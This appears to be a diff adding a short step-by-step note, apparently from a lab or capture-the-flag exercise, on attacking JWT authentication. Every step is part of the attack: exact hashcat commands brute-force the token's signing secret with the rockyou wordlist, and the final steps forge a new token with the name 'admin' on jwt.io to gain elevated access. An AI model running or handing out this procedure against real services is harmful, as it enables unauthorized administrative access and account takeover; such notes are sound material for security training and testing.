@@ -1,0 +1,8 @@
+1. Copy the JWT an save to a JWT.txt
+2. Use hashcat to bruteforce JWT.
+   hashcat -a 0 -m 16500 JWT.txt /usr/share/wordlists/rockyou.txt --force
+3. Use --show to view the secret signature.
+   hashcat -a 0 -m 16500 JWT.txt /usr/share/wordlists/rockyou.txt --show
+4. Visit https://jwt.io and past the secret signature in the field of 'your-256-bit-secret'.
+5. Create new JWT with payload name 'admin' and copy the token and use it :-)
+
